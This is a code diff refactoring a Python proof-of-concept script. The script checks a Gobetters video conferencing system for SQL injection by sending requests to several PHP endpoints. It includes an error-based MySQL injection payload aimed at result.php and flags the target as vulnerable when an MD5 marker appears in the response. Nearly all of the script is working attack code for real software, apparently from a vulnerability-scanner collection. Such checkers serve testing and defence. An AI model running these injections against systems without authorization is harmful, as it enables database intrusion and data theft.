@@ -10,14 +10,7 @@ import sys
 import json
 import requests
 import warnings
-  
-  
-
-class multi_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['Gobetters视频会议系统SQL注入漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -33,14 +26,14 @@ class multi_sqli:
                     ""]
         try:
             for payload in payloads:
-                vulnurl = self.url + payload
+                vulnurl = url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     result[2]=  '存在'
                     result[1] = vulnurl
                     return  result
 
-            vulnurl = self.url + "/web/users/usersave.php"
+            vulnurl = url + "/web/users/usersave.php"
             post_data = {
                 "from":"123",
                 "deptid":"0",
@@ -62,7 +55,7 @@ class multi_sqli:
                 result[2]=  '存在'
                 result[1] =vulnurl+"\npost: "+json.dumps(post_data, indent=4)
                 return result
-            vulnurl = self.url + "/web/department/departmentsave.php"
+            vulnurl = url + "/web/department/departmentsave.php"
             post_data = {
                 "deptid":"1",
                 "deptcode":"1",
@@ -74,7 +67,7 @@ class multi_sqli:
                 result[2]=  '存在'
                 result[1] =vulnurl+"\npost: "+json.dumps(post_data, indent=4)
                 return result
-            vulnurl = self.url + "/web/monitor/monitormentsave.php"
+            vulnurl = url + "/web/monitor/monitormentsave.php"
             post_data = {
                 "deptid":"1",
                 "deptcode":"1",
@@ -87,7 +80,7 @@ class multi_sqli:
                 result[1] =vulnurl+"\npost: "+json.dumps(post_data, indent=4)
                 return result
 
-            vulnurl = self.url + "/web/users/result.php"
+            vulnurl = url + "/web/users/result.php"
             post_data = {
                 "username":"1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1"
             }
@@ -105,5 +98,4 @@ class multi_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = multi_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
